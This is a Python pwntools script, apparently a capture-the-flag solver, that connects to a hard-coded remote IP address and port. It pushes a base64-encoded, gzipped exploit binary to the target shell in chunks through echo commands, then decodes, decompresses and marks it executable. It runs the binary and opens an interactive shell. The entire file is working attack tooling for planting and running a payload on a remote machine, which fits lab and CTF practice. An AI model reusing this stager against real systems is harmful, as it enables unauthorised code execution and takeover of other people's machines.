#!/usr/bin/env python
# encoding: utf-8;

from pwn import *

context(os='linux', arch='amd64')


def hoge():
    global r
    pass


def exploit():
    global r

    # before run this script, compile/gzip/base64 the exploit.
    with open("./exploit.gz.b64", 'r') as f:
        binary = f.read()

    progress = 0
    N = 0x300
    r.sendlineafter('$', 'cd /tmp')
    with log.progress("sending base64ed exploit (total: {})".format(hex(len(binary)))) as l:
        for s in [binary[i: i + N] for i in range(0, len(binary), N)]:
            r.sendlineafter('/tmp $', 'echo -n "{}" >> ./exploit.gz.b64'.format(s))  # don't forget -n
            progress += N
            if progress % N == 0:
                l.status("\r sent {} bytes [{:.2f} %]".format(hex(progress), float(progress) * 100.0 / float(len(binary))))

    log.success("finish sending exploit.")
    r.sendlineafter('$', 'base64 -d ./exploit.gz.b64 > exploit.gz')
    r.sendlineafter('$', 'gunzip ./exploit.gz')

    r.sendlineafter('$', 'chmod +x ./exploit')
    r.sendlineafter('$', './exploit')

    r.interactive()


if __name__ == "__main__":
    global r

    r = remote("64.227.36.254", 7021)
    exploit()
